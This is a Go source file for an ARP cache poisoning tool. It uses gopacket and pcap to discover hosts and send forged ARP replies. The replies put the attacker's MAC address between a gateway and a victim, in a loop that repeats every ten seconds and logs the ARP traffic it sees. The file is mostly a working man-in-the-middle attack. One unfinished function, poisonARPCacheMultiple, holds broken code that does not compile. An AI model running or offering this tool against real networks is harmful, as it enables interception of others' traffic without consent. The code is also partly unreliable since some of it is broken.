package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func checkIPs(ips ...string) error {
	for _, ip := range ips {
		if net.ParseIP(ip) == nil {
			msg := ip + " not in the correct ipv4 format: x.x.x.x"
			return errors.New(msg)
		}
	}
	return nil
}

func ping(ips []net.IP) []net.IP {
	var liveAddresses []net.IP
	var lock sync.Mutex
	var wg sync.WaitGroup

	for _, ip := range ips {
		wg.Add(1)
		go func(ip net.IP) {
			defer wg.Done()
			fmt.Println("pinging ", ip.String())
			cmd := exec.Command("ping", ip.String())
			if err := cmd.Run(); err != nil {
				fmt.Println("failed to ping ", ip.String())
				return
			}
			fmt.Println("successfully pinged ", ip.String())
			lock.Lock()
			liveAddresses = append(liveAddresses, ip)
			lock.Unlock()
		}(ip)
	}
	wg.Wait()

	return liveAddresses
}

type DeviceInfo struct {
	IP  net.IP
	MAC net.HardwareAddr
}

func NewDeviceInfo(ip net.IP, mac net.HardwareAddr) *DeviceInfo {
	return &DeviceInfo{
		IP:  ip,
		MAC: mac,
	}
}

func mapIPstoMAC(ips []net.IP) ([]*DeviceInfo, error) {
	ping(ips)

	var devices []*DeviceInfo

	data := exec.Command("arp", "-a")
	byteData, err := data.Output()
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(byteData), "\n")

	for _, ip := range ips {
		skip := false
		for _, line := range lines {
			if line[0] != ' ' {
				skip = true
				continue
			}

			if skip {
				skip = false
				continue
			}

			fields := strings.Fields(line)

			if ip.String() == fields[0] {
				mac, err := net.ParseMAC(fields[1])
				if err != nil {
					return nil, err
				}

				devices = append(devices, NewDeviceInfo(net.ParseIP(fields[0]), mac))
				break
			}
		}
	}

	return devices, nil
}

func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
	eth := layers.Ethernet{
		SrcMAC:       attackerInfo.MAC,
		DstMAC:       to.MAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   attackerInfo.MAC,
		SourceProtAddress: from.IP.To4(),
		DstHwAddress:      to.MAC,
		DstProtAddress:    to.IP.To4(),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}

	if err := deviceHandle.WritePacketData(buf.Bytes()); err != nil {
		return err
	}

	return nil
}

func getAllIPs(attackerIP net.IP) []net.IP {
	ipnet := net.IPNet{
		IP:   attackerIP,
		Mask: attackerIP.DefaultMask(),
	}

	ipAsUint := binary.BigEndian.Uint32(ipnet.IP.To4())
	maskAsUint := binary.BigEndian.Uint32(ipnet.Mask)

	network := ipAsUint & maskAsUint
	broadcast := network | ^maskAsUint

	var addresses []net.IP

	for network++; network < broadcast; network++ {
		b1 := uint8(network & 0xff)
		b2 := uint8((network >> 8) & 0xff)
		b3 := uint8((network >> 16) & 0xff)
		b4 := uint8((network >> 24) & 0xff)

		ipAddr := net.IPv4(b4, b3, b2, b1)
		addresses = append(addresses, ipAddr)
	}

	return addresses
}

// TODO
func poisonARPCacheMultiple(gateway net.IP, victims []net.IP, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
	var wg sync.WaitGroup

	liveDevices := ping(victims)

	vicDevices, err := mapIPstoMAC(liveDevices)
	if err != nil {
		return err
	}

	lenDevices := len(vicDevices)

	gatewayDev

	for _, victim := range devices[:len(devices)-1] {
		wg.Add(1)

		go func(victim *DeviceInfo) {
			defer wg.Done()
			defer func() {
				if err := recover(); err != nil {
					fmt.Println("error poisoning device: (", victim.IP.String(), ",", victim.MAC.String(), ")")
				}
			}()

			if err := sendARPReply(gateway, victim, attackerInfo, deviceHandle); err != nil {
				panic(err)
			}

			if err := sendARPReply(victim, gateway, attackerInfo, deviceHandle); err != nil {
				panic(err)
			}

		}(victim)
	}

	wg.Wait()

	return nil
}

func poisonARPCache(devicesInfo []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
	dev1 := devicesInfo[0]
	dev2 := devicesInfo[1]

	if err := sendARPReply(dev1, dev2, attackerInfo, deviceHandle); err != nil {
		return err
	}

	if err := sendARPReply(dev2, dev1, attackerInfo, deviceHandle); err != nil {
		return err
	}

	return nil
}

type AttackerInfo struct {
	MAC net.HardwareAddr
	IP  net.IP
}

func getWindowsInterface(ifaceArg string) (string, error) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return "", err
	}

	devToAddrs := make(map[string][]pcap.InterfaceAddress)

	for _, device := range devices {
		devToAddrs[device.Name] = device.Addresses
	}

	iface, err := net.InterfaceByName(ifaceArg)
	if err != nil {
		return "", err
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return "", err
	}

	for nameKey, addrsVal := range devToAddrs {
		for _, devAddr := range addrsVal {
			for _, addr := range addrs {
				if devAddr.IP.To4() != nil {
					if strings.Contains(addr.String(), devAddr.IP.String()) {
						return nameKey, nil
					}
				}
			}
		}
	}

	return "", errors.New("failed to find appropriate interface")
}

func getAttackerInfo(ifaceArg string) (*AttackerInfo, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var info AttackerInfo
	for _, iface := range ifaces {
		if iface.Name == ifaceArg {
			info.MAC = iface.HardwareAddr
			addrs, err := iface.Addrs()
			if err != nil {
				return nil, err
			}

			for _, ip := range addrs {
				idx := strings.Index(ip.String(), "/")
				parsed := net.ParseIP(ip.String()[:idx])
				if parsed == nil {
					return nil, errors.New("failed to parse ip")
				}
				if parsed.To4() == nil {
					continue
				}
				info.IP = parsed
			}
		}
	}

	if info.IP == nil {
		return nil, errors.New("failed to obtain attacker's ip address")
	}

	return &info, nil
}

func readPackets(deviceHandle *pcap.Handle) {
	packetSource := gopacket.NewPacketSource(deviceHandle, deviceHandle.LinkType())

	for packet := range packetSource.Packets() {
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}
		arp := arpLayer.(*layers.ARP)
		fmt.Println(arp.Operation)
		fmt.Println("source mac: ", net.HardwareAddr(arp.SourceHwAddress).String())
		fmt.Println("source ip: ", net.IP(arp.SourceProtAddress).String())
		fmt.Println("dst mac: ", net.HardwareAddr(arp.DstHwAddress).String())
		fmt.Println("dst ip: ", net.IP(arp.DstProtAddress).String())
		fmt.Println()
	}
}

var (
	incorrectIPFormatErr = errors.New("err: incorrect IP format")
)

func main() {
	if len(os.Args) != 4 {
		fmt.Println("usage: <interface> <gateway ip> <victim2 ip>")
		os.Exit(0)
	}

	interfaceStr := os.Args[1]
	gatewayIP := net.ParseIP(os.Args[2])
	if gatewayIP == nil {
		log.Fatal(incorrectIPFormatErr)
	}

	victimIP := net.ParseIP(os.Args[3])
	if victimIP == nil {
		log.Fatal(incorrectIPFormatErr)
	}

	attackerInfo, err := getAttackerInfo(interfaceStr)
	if err != nil {
		log.Fatal(err)
	}

	device, err := getWindowsInterface(interfaceStr)
	if err != nil {
		log.Fatal(err)
	}

	deviceHandle, err := pcap.OpenLive(device, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer deviceHandle.Close()

	devicesInfo, err := mapIPstoMAC([]net.IP{gatewayIP, victimIP})
	if err != nil {
		log.Fatal(err)
	}

	endSignal := make(chan os.Signal, 1)
	signal.Notify(endSignal, syscall.SIGTERM, syscall.SIGINT)

	go func() {
		for sig := range endSignal {
			fmt.Println(sig.String(), "detected. ending program")
			close(endSignal)
			os.Exit(0)
		}
	}()

	go readPackets(deviceHandle)

	for {
		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle); err != nil {
			log.Fatal(err)
		}
		time.Sleep(time.Second * 10)
	}
}
